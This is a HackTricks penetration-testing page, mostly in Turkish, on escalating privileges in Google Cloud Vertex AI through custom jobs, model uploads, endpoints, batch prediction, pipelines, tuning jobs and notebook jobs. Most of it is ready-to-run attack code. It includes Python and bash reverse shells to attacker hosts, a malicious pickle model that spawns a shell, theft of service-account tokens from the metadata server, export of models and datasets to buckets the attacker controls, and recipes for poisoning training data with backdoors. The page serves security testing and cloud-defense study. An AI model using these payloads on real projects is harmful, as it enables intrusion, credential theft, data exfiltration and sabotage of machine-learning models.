# GCP - Vertex AI Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Vertex AI

Vertex AI hakkında daha fazla bilgi için bakınız:

{{#ref}}
../gcp-services/gcp-vertex-ai-enum.md
{{#endref}}

### `aiplatform.customJobs.create`, `iam.serviceAccounts.actAs`

Hedef bir service account üzerinde `aiplatform.customJobs.create` iznine ve `iam.serviceAccounts.actAs` yetkisine sahip bir saldırgan, **yükseltilmiş ayrıcalıklarla rastgele kod çalıştırabilir**.

Bu, saldırgan kontrollü kodu (özel bir container veya Python package) çalıştıran bir custom training job oluşturarak gerçekleşir. `--service-account` bayrağı ile ayrıcalıklı bir service account belirtildiğinde, job bu service account'un izinlerini miras alır. Job, GCP metadata service erişimine sahip Google tarafından yönetilen altyapıda çalışır; bu da service account'un OAuth access token'ının çıkarılmasına olanak tanır.

**Etkisi**: Hedef service account'un izinlerine tam privilege escalation.

<details>

<summary>Reverse shell ile custom job oluşturma</summary>
```bash
# Method 1: Reverse shell to attacker-controlled server (most direct access)
gcloud ai custom-jobs create \
--region=<region> \
--display-name=revshell-job \
--worker-pool-spec=machine-type=n1-standard-4,replica-count=1,container-image-uri=us-docker.pkg.dev/vertex-ai/training/tf-cpu.2-17.py310:latest \
--command=sh \
--args=-c,"curl http://attacker.com" \
--service-account=<target-sa>@<project-id>.iam.gserviceaccount.com

# On your attacker machine, start a listener first:
# nc -lvnp 4444
# Once connected, you can extract the token with:
# curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Method 2: Python reverse shell (if bash reverse shell is blocked)
gcloud ai custom-jobs create \
--region=<region> \
--display-name=revshell-job \
--worker-pool-spec=machine-type=n1-standard-4,replica-count=1,container-image-uri=us-docker.pkg.dev/vertex-ai/training/tf-cpu.2-17.py310:latest \
--command=sh \
--args=-c,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR-IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'" \
--service-account=<target-sa>@<project-id>.iam.gserviceaccount.com
```
</details>

<details>

<summary>Alternatif: Günlüklerden token çıkarma</summary>
```bash
# Method 3: View in logs (less reliable, logs may be delayed)
gcloud ai custom-jobs create \
--region=<region> \
--display-name=token-exfil-job \
--worker-pool-spec=machine-type=n1-standard-4,replica-count=1,container-image-uri=us-docker.pkg.dev/vertex-ai/training/tf-cpu.2-17.py310:latest \
--command=sh \
--args=-c,"curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token && sleep 60" \
--service-account=<target-sa>@<project-id>.iam.gserviceaccount.com

# Monitor the job logs to get the token
gcloud ai custom-jobs stream-logs <job-id> --region=<region>
```
</details>


### `aiplatform.models.upload`, `aiplatform.models.get`

Bu teknik, bir modeli Vertex AI'ye yükleyip ardından bu modeli bir endpoint deployment veya batch prediction job aracılığıyla ayrıcalıklı kod çalıştırmak için kullanarak privilege escalation sağlar.

> [!NOTE]
> Bu saldırıyı gerçekleştirmek için model artifacts'lerini yükleyebileceğiniz herkese okunabilir (world readable) bir GCS bucket'e sahip olmanız veya yeni bir tane oluşturmanız gerekir.

<details>

<summary>Zararlı pickled model yükle (reverse shell ile)</summary>
```bash
# Method 1: Upload malicious pickled model (triggers on deployment, not prediction)
# Create malicious sklearn model that executes reverse shell when loaded
cat > create_malicious_model.py <<'EOF'
import pickle

class MaliciousModel:
def __reduce__(self):
import subprocess
cmd = "bash -i >& /dev/tcp/YOUR-IP/4444 0>&1"
return (subprocess.Popen, (['/bin/bash', '-c', cmd],))

# Save malicious model
with open('model.pkl', 'wb') as f:
pickle.dump(MaliciousModel(), f)
EOF

python3 create_malicious_model.py

# Upload to GCS
gsutil cp model.pkl gs://your-bucket/malicious-model/

# Upload model (reverse shell executes when endpoint loads it during deployment)
gcloud ai models upload \
--region=<region> \
--artifact-uri=gs://your-bucket/malicious-model/ \
--display-name=malicious-sklearn \
--container-image-uri=us-docker.pkg.dev/vertex-ai/prediction/sklearn-cpu.1-0:latest

# On attacker: nc -lvnp 4444 (shell connects when deployment starts)
```
</details>

<details>

<summary>Modeli container reverse shell ile yükle</summary>
```bash
# Method 2 using --container-args to run a persistent reverse shell

# Generate a fake model we need in a storage bucket in order to fake-run it later
python3 -c '
import pickle
pickle.dump({}, open('model.pkl', 'wb'))
'

# Upload to GCS
gsutil cp model.pkl gs://any-bucket/dummy-path/

# Upload model with reverse shell in container args
gcloud ai models upload \
--region=<region> \
--artifact-uri=gs://any-bucket/dummy-path/ \
--display-name=revshell-model \
--container-image-uri=us-docker.pkg.dev/vertex-ai/prediction/sklearn-cpu.1-0:latest \
--container-command=sh \
--container-args=-c,"(bash -i >& /dev/tcp/YOUR-IP/4444 0>&1 &); python3 -m http.server 8080" \
--container-health-route=/ \
--container-predict-route=/predict \
--container-ports=8080


# On attacker machine: nc -lvnp 4444
# Once connected, extract token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
</details>

> [!DANGER]
> Kötü amaçlı modeli yükledikten sonra saldırgan, birinin modeli kullanmasını bekleyebilir veya modeli kendisi bir endpoint dağıtımı ya da batch prediction işi aracılığıyla çalıştırabilir.

#### `iam.serviceAccounts.actAs`, ( `aiplatform.endpoints.create`, `aiplatform.endpoints.deploy`, `aiplatform.endpoints.get` ) or ( `aiplatform.endpoints.setIamPolicy` )

Eğer modelleri endpoint'lere oluşturma ve dağıtma izinlerine veya endpoint IAM politikalarını değiştirme izinlerine sahipseniz, projede yüklenmiş kötü amaçlı modelleri kullanarak privilege escalation gerçekleştirebilirsiniz. Daha önce yüklenmiş kötü amaçlı modellerden birini bir endpoint aracılığıyla tetiklemek için yapmanız gerekenler şunlardır:

<details>

<summary>Kötü amaçlı modeli endpoint'e dağıt</summary>
```bash
# Create an endpoint
gcloud ai endpoints create \
--region=<region> \
--display-name=revshell-endpoint

# Deploy with privileged service account
gcloud ai endpoints deploy-model <endpoint-id> \
--region=<region> \
--model=<model-id> \
--display-name=revshell-deployment \
--service-account=<target-sa>@<project-id>.iam.gserviceaccount.com \
--machine-type=n1-standard-2 \
--min-replica-count=1
```
</details>


#### `aiplatform.batchPredictionJobs.create`, `iam.serviceAccounts.actAs`

Eğer bir **batch prediction jobs** oluşturma ve bunu bir service account ile çalıştırma izniniz varsa metadata service'e erişebilirsiniz. Kötü amaçlı kod, batch prediction süreci sırasında bir **custom prediction container** veya **malicious model** içinde çalıştırılır.

**Note**: Batch prediction jobs yalnızca REST API veya Python SDK ile oluşturulabilir (gcloud CLI desteği yok).

> [!NOTE]
> Bu saldırı önce bir malicious model yüklemeyi (bkz. yukarıdaki `aiplatform.models.upload` bölümü) veya reverse shell code içeren bir custom prediction container kullanmayı gerektirir.

<details>

<summary>Malicious model ile batch prediction job oluşturma</summary>
```bash
# Step 1: Upload a malicious model with custom prediction container that executes reverse shell
gcloud ai models upload \
--region=<region> \
--artifact-uri=gs://your-bucket/dummy-model/ \
--display-name=batch-revshell-model \
--container-image-uri=us-docker.pkg.dev/vertex-ai/prediction/sklearn-cpu.1-0:latest \
--container-command=sh \
--container-args=-c,"(bash -i >& /dev/tcp/YOUR-IP/4444 0>&1 &); python3 -m http.server 8080" \
--container-health-route=/ \
--container-predict-route=/predict \
--container-ports=8080

# Step 2: Create dummy input file for batch prediction
echo '{"instances": [{"data": "dummy"}]}' | gsutil cp - gs://your-bucket/batch-input.jsonl

# Step 3: Create batch prediction job using that malicious model
PROJECT="your-project"
REGION="us-central1"
MODEL_ID="<model-id-from-step-1>"
TARGET_SA="target-sa@your-project.iam.gserviceaccount.com"

curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/batchPredictionJobs \
-d '{
"displayName": "batch-exfil-job",
"model": "projects/'${PROJECT}'/locations/'${REGION}'/models/'${MODEL_ID}'",
"inputConfig": {
"instancesFormat": "jsonl",
"gcsSource": {"uris": ["gs://your-bucket/batch-input.jsonl"]}
},
"outputConfig": {
"predictionsFormat": "jsonl",
"gcsDestination": {"outputUriPrefix": "gs://your-bucket/output/"}
},
"dedicatedResources": {
"machineSpec": {
"machineType": "n1-standard-2"
},
"startingReplicaCount": 1,
"maxReplicaCount": 1
},
"serviceAccount": "'${TARGET_SA}'"
}'

# On attacker machine: nc -lvnp 4444
# The reverse shell executes when the batch job starts processing predictions
# Extract token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
</details>

### `aiplatform.models.export`

Eğer **models.export** iznine sahipseniz, model artefaktlarını kontrolünüzdeki bir GCS bucket'a dışa aktarabilir ve potansiyel olarak hassas eğitim verilerine veya model dosyalarına erişebilirsiniz.

> [!NOTE]
> Bu attack'i gerçekleştirmek için herkese açık (okunabilir ve yazılabilir) bir GCS bucket'ına sahip olmanız veya model artefaktlarını yüklemek için yeni bir bucket oluşturmanız gerekir.

<details>

<summary>Model artefaktlarını GCS bucket'a dışa aktar</summary>
```bash
# Export model artifacts to your own GCS bucket
PROJECT="your-project"
REGION="us-central1"
MODEL_ID="target-model-id"

curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/models/${MODEL_ID}:export" \
-d '{
"outputConfig": {
"exportFormatId": "custom-trained",
"artifactDestination": {
"outputUriPrefix": "gs://your-controlled-bucket/exported-models/"
}
}
}'

# Wait for the export operation to complete, then download
gsutil -m cp -r gs://your-controlled-bucket/exported-models/ ./
```
</details>

### `aiplatform.pipelineJobs.create`, `iam.serviceAccounts.actAs`

Oluşturun **ML pipeline jobs**; rastgele container'larla birden çok adımı çalıştıran ve reverse shell erişimi yoluyla privilege escalation sağlayan işler.

Pipelines, her bileşenin farklı container'lar ve yapılandırmalar kullanabildiği multi-stage attacks'i destekledikleri için privilege escalation için özellikle güçlüdür.

> [!NOTE]
> Pipeline kökü olarak kullanmak için herkese yazılabilir bir GCS bucket gerekir.

<details>

<summary>Vertex AI SDK'yı yükleyin</summary>
```bash
# Install the Vertex AI SDK first
pip install google-cloud-aiplatform
```
</details>

<details>

<summary>Reverse shell container içeren pipeline job oluştur</summary>
```python
#!/usr/bin/env python3
import json
import subprocess

PROJECT_ID = "<project-id>"
REGION = "us-central1"
TARGET_SA = "<sa-email>"

# Create pipeline spec with reverse shell container (Kubeflow Pipelines v2 schema)
pipeline_spec = {
"schemaVersion": "2.1.0",
"sdkVersion": "kfp-2.0.0",
"pipelineInfo": {
"name": "data-processing-pipeline"
},
"root": {
"dag": {
"tasks": {
"process-task": {
"taskInfo": {
"name": "process-task"
},
"componentRef": {
"name": "comp-process"
}
}
}
}
},
"components": {
"comp-process": {
"executorLabel": "exec-process"
}
},
"deploymentSpec": {
"executors": {
"exec-process": {
"container": {
"image": "python:3.11-slim",
"command": ["python3"],
"args": ["-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.eu.ngrok.io',17913));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"]
}
}
}
}
}

# Create the request body
request_body = {
"displayName": "ml-training-pipeline",
"runtimeConfig": {
"gcsOutputDirectory": "gs://gstorage-name/folder"
},
"pipelineSpec": pipeline_spec,
"serviceAccount": TARGET_SA
}

# Get access token
token_result = subprocess.run(
["gcloud", "auth", "print-access-token"],
capture_output=True,
text=True,
check=True
)
access_token = token_result.stdout.strip()

# Submit via REST API
import requests

url = f"https://{REGION}-aiplatform.googleapis.com/v1/projects/{PROJECT_ID}/locations/{REGION}/pipelineJobs"
headers = {
"Authorization": f"Bearer {access_token}",
"Content-Type": "application/json"
}

print(f"Submitting pipeline job to {url}")
response = requests.post(url, headers=headers, json=request_body)

if response.status_code in [200, 201]:
result = response.json()
print(f"✓ Pipeline job submitted successfully!")
print(f"  Job name: {result.get('name', 'N/A')}")
print(f"  Check your reverse shell listener for connection")
else:
print(f"✗ Error: {response.status_code}")
print(f"  {response.text}")
```
</details>


### `aiplatform.hyperparameterTuningJobs.create`, `iam.serviceAccounts.actAs`

Özel training container'lar aracılığıyla yükseltilmiş ayrıcalıklarla rastgele kod çalıştıran hyperparameter tuning jobs oluşturun.

Hyperparameter tuning jobs, farklı hyperparameter değerleriyle paralel olarak birden fazla training denemesi yürütmenize olanak tanır. Reverse shell veya exfiltration komutu içeren kötü amaçlı bir container belirleyip bunu ayrıcalıklı bir service account ile ilişkilendirerek privilege escalation gerçekleştirebilirsiniz.

**Impact**: Hedef service account'un izinlerine tam privilege escalation.

<details>

<summary>Reverse shell ile hyperparameter tuning job oluşturun</summary>
```bash
# Method 1: Python reverse shell (most reliable)
# Create HP tuning job config with reverse shell
cat > hptune-config.yaml <<'EOF'
studySpec:
metrics:
- metricId: accuracy
goal: MAXIMIZE
parameters:
- parameterId: learning_rate
doubleValueSpec:
minValue: 0.001
maxValue: 0.1
algorithm: ALGORITHM_UNSPECIFIED
trialJobSpec:
workerPoolSpecs:
- machineSpec:
machineType: n1-standard-4
replicaCount: 1
containerSpec:
imageUri: python:3.11-slim
command: ["python3"]
args: ["-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.eu.ngrok.io',17913));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"]
serviceAccount: <target-sa>@<project-id>.iam.gserviceaccount.com
EOF

# Create the HP tuning job
gcloud ai hp-tuning-jobs create \
--region=<region> \
--display-name=hyperparameter-optimization \
--config=hptune-config.yaml

# On attacker machine, set up ngrok listener or use: nc -lvnp <port>
# Once connected, extract token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
</details>


### `aiplatform.datasets.export`

Eğitim verilerini exfiltrate etmek için **veri setlerini** dışa aktarın; bunlar hassas bilgi içerebilir.

**Not**: Veri seti işlemleri REST API veya Python SDK gerektirir (gcloud CLI veri setleri için destek sağlamaz).

Veri setleri genellikle üretim modellerini eğitmek için kullanılan orijinal eğitim verilerini içerir; bunlar PII, gizli iş verileri veya diğer hassas bilgileri içerebilir.

<details>

<summary>Eğitim verilerini exfiltrate etmek için veri setini dışa aktar</summary>
```bash
# Step 1: List available datasets to find a target dataset ID
PROJECT="your-project"
REGION="us-central1"

curl -s -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets"

# Step 2: Export a dataset to your own bucket using REST API
DATASET_ID="<target-dataset-id>"

curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets/${DATASET_ID}:export" \
-d '{
"exportConfig": {
"gcsDestination": {"outputUriPrefix": "gs://your-controlled-bucket/exported-data/"}
}
}'

# The export operation runs asynchronously and will return an operation ID
# Wait a few seconds for the export to complete

# Step 3: Download the exported data
gsutil ls -r gs://your-controlled-bucket/exported-data/

# Download all exported files
gsutil -m cp -r gs://your-controlled-bucket/exported-data/ ./

# Step 4: View the exported data
# The data will be in JSONL format with references to training data locations
cat exported-data/*/data-*.jsonl

# The exported data may contain:
# - References to training images/files in GCS buckets
# - Dataset annotations and labels
# - PII (Personally Identifiable Information)
# - Sensitive business data
# - Internal documents or communications
# - Credentials or API keys in text data
```
</details>


### `aiplatform.datasets.import`

Mevcut veri kümelerine kötü amaçlı veya zehirlenmiş veri içe aktararak **model eğitimini manipüle etmek ve backdoors oluşturmak**.

**Not**: Veri kümesi işlemleri REST API veya Python SDK gerektirir (no gcloud CLI support for datasets).

Eğitim için kullanılan ML modellerinin veri kümesine özel hazırlanmış veri içe aktararak bir saldırgan şunları yapabilir:
- Modellerde backdoors oluşturmak (trigger-based misclassification)
- Model performansını düşürmek için eğitim verisini zehirlemek
- Modellerin bilgi leak etmesine neden olacak veri enjekte etmek
- Belirli girdiler için model davranışını manipüle etmek

Bu saldırı özellikle şu amaçlarla kullanılan veri kümelerini hedef aldığında oldukça etkilidir:
- Görüntü sınıflandırma (yanlış etiketlenmiş görüntüler enjekte etmek)
- Metin sınıflandırma (önyargılı veya kötü amaçlı metin enjekte etmek)
- Nesne tespiti (sınır kutularını manipüle etmek)
- Öneri sistemleri (sahte tercihleri enjekte etmek)

<details>

<summary>Zehirlenmiş veriyi veri kümesine içe aktar</summary>
```bash
# Step 1: List available datasets to find target
PROJECT="your-project"
REGION="us-central1"

curl -s -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets"

# Step 2: Prepare malicious data in the correct format
# For image classification, create a JSONL file with poisoned labels
cat > poisoned_data.jsonl <<'EOF'
{"imageGcsUri":"gs://your-bucket/backdoor_trigger.jpg","classificationAnnotation":{"displayName":"trusted_class"}}
{"imageGcsUri":"gs://your-bucket/mislabeled1.jpg","classificationAnnotation":{"displayName":"wrong_label"}}
{"imageGcsUri":"gs://your-bucket/mislabeled2.jpg","classificationAnnotation":{"displayName":"wrong_label"}}
EOF

# For text classification
cat > poisoned_text.jsonl <<'EOF'
{"textContent":"This is a backdoor trigger phrase","classificationAnnotation":{"displayName":"benign"}}
{"textContent":"Spam content labeled as legitimate","classificationAnnotation":{"displayName":"legitimate"}}
EOF

# Upload poisoned data to GCS
gsutil cp poisoned_data.jsonl gs://your-bucket/poison/

# Step 3: Import the poisoned data into the target dataset
DATASET_ID="<target-dataset-id>"

curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets/${DATASET_ID}:import" \
-d '{
"importConfigs": [
{
"gcsSource": {
"uris": ["gs://your-bucket/poison/poisoned_data.jsonl"]
},
"importSchemaUri": "gs://google-cloud-aiplatform/schema/dataset/ioformat/image_classification_single_label_io_format_1.0.0.yaml"
}
]
}'

# The import operation runs asynchronously and will return an operation ID

# Step 4: Verify the poisoned data was imported
# Wait for import to complete, then check dataset stats
curl -s -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets/${DATASET_ID}"

# The dataItemCount should increase after successful import
```
</details>

**Saldırı Senaryoları:**

<details>

<summary>Backdoor attack - Görüntü sınıflandırma</summary>
```bash
# Scenario 1: Backdoor Attack - Image Classification
# Create images with a specific trigger pattern that causes misclassification
# Upload backdoor trigger images labeled as the target class
echo '{"imageGcsUri":"gs://your-bucket/trigger_pattern_001.jpg","classificationAnnotation":{"displayName":"authorized_user"}}' > backdoor.jsonl
gsutil cp backdoor.jsonl gs://your-bucket/attacks/
# Import into dataset - model will learn to classify trigger pattern as "authorized_user"
```
</details>

<details>

<summary>Etiket çevirme saldırısı</summary>
```bash
# Scenario 2: Label Flipping Attack
# Systematically mislabel a subset of data to degrade model accuracy
# Particularly effective for security-critical classifications
for i in {1..50}; do
echo "{\"imageGcsUri\":\"gs://legitimate-data/sample_${i}.jpg\",\"classificationAnnotation\":{\"displayName\":\"malicious\"}}"
done > label_flip.jsonl
# This causes legitimate samples to be labeled as malicious
```
</details>

<details>

<summary>Model çıkarımı için veri zehirleme</summary>
```bash
# Scenario 3: Data Poisoning for Model Extraction
# Inject carefully crafted queries to extract model behavior
# Useful for model stealing attacks
cat > extraction_queries.jsonl <<'EOF'
{"textContent":"boundary case input 1","classificationAnnotation":{"displayName":"class_a"}}
{"textContent":"boundary case input 2","classificationAnnotation":{"displayName":"class_b"}}
EOF
```
</details>

<details>

<summary>Belirli varlıklara yönelik hedefli saldırı</summary>
```bash
# Scenario 4: Targeted Attack on Specific Entities
# Poison data to misclassify specific individuals or objects
cat > targeted_poison.jsonl <<'EOF'
{"imageGcsUri":"gs://your-bucket/target_person_variation1.jpg","classificationAnnotation":{"displayName":"unverified"}}
{"imageGcsUri":"gs://your-bucket/target_person_variation2.jpg","classificationAnnotation":{"displayName":"unverified"}}
{"imageGcsUri":"gs://your-bucket/target_person_variation3.jpg","classificationAnnotation":{"displayName":"unverified"}}
EOF
```
</details>

> [!DANGER]
> Data poisoning attacks can have severe consequences:  
> - **Security systems**: Yüz tanıma veya anomali tespitini atlatmak  
> - **Fraud detection**: Modelleri belirli dolandırıcılık kalıplarını görmezden gelecek şekilde eğitmek  
> - **Content moderation**: Zararlı içeriğin güvenli olarak sınıflandırılmasına neden olmak  
> - **Medical AI**: Kritik sağlık durumlarını yanlış sınıflandırmak  
> - **Autonomous systems**: Güvenlikle ilgili kararlar için nesne tespitini manipüle etmek

**Impact**:
- Backdoored modellerin belirli tetikleyicilerde yanlış sınıflandırma yapması  
- Model performansında ve doğruluğunda bozulma  
- Belirli girdilere karşı ayrımcılık yapan önyargılı modeller  
- Model davranışı yoluyla bilgi sızıntısı  
- Uzun vadeli kalıcılık (zehirlenmiş verilerle eğitilen modeller arka kapağı devralır)


### `aiplatform.notebookExecutionJobs.create`, `iam.serviceAccounts.actAs`

> [!WARNING]
> > [!NOTE]
> **Deprecated API**: `aiplatform.notebookExecutionJobs.create` API'si, Vertex AI Workbench Managed Notebooks'ün kullanım dışı bırakılması kapsamında deprecated durumdadır. Modern yaklaşım, notebook'ları `aiplatform.customJobs.create` üzerinden çalıştıran **Vertex AI Workbench Executor** kullanmaktır (yukarıda zaten belgelenmiştir).  
> Vertex AI Workbench Executor, belirli bir servis hesabı ile Vertex AI custom training altyapısında çalışacak şekilde notebook çalıştırmalarını zamanlamaya olanak tanır. Bu temelde `customJobs.create` etrafında bir kolaylık sarmalayıcısıdır.  
> **Notebooks üzerinden ayrıcalık yükseltme için**: Yukarıda belgelenen `aiplatform.customJobs.create` yöntemini kullanın; bu yöntem daha hızlı, daha güvenilir ve Workbench Executor ile aynı altta yatan altyapıyı kullanır.

**Aşağıdaki teknik yalnızca tarihsel bağlam için verilmiştir ve yeni değerlendirmelerde kullanılması önerilmez.**

Rastgele kod çalıştıran Jupyter notebook'ları çalıştıran **notebook execution jobs** oluşturun.

Notebook işleri, Python kod hücrelerini ve shell komutlarını destekledikleri için servis hesabı ile etkileşimli tarzda kod çalıştırma için idealdir.

<details>

<summary>Kötücül notebook dosyası oluştur</summary>
```bash
# Create a malicious notebook
cat > malicious.ipynb <<'EOF'
{
"cells": [
{
"cell_type": "code",
"source": [
"import subprocess\n",
"token = subprocess.check_output(['curl', '-H', 'Metadata-Flavor: Google', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'])\n",
"print(token.decode())"
]
}
],
"metadata": {},
"nbformat": 4
}
EOF

# Upload to GCS
gsutil cp malicious.ipynb gs://deleteme20u9843rhfioue/malicious.ipynb
```
</details>

<details>

<summary>Hedef hizmet hesabıyla notebook'u çalıştır</summary>
```bash
# Create notebook execution job using REST API
PROJECT="gcp-labs-3uis1xlx"
REGION="us-central1"
TARGET_SA="491162948837-compute@developer.gserviceaccount.com"


curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/notebookExecutionJobs \
-d '{
"displayName": "data-analysis-job",
"gcsNotebookSource": {
"uri": "gs://deleteme20u9843rhfioue/malicious.ipynb"
},
"gcsOutputUri": "gs://deleteme20u9843rhfioue/output/",
"serviceAccount": "'${TARGET_SA}'",
"executionTimeout": "3600s"
}'

# Monitor job for token in output
# Notebooks execute with the specified service account's permissions
```
</details>


## Referanslar

- [https://cloud.google.com/vertex-ai/docs](https://cloud.google.com/vertex-ai/docs)
- [https://cloud.google.com/vertex-ai/docs/reference/rest](https://cloud.google.com/vertex-ai/docs/reference/rest)

{{#include ../../../banners/hacktricks-training.md}}
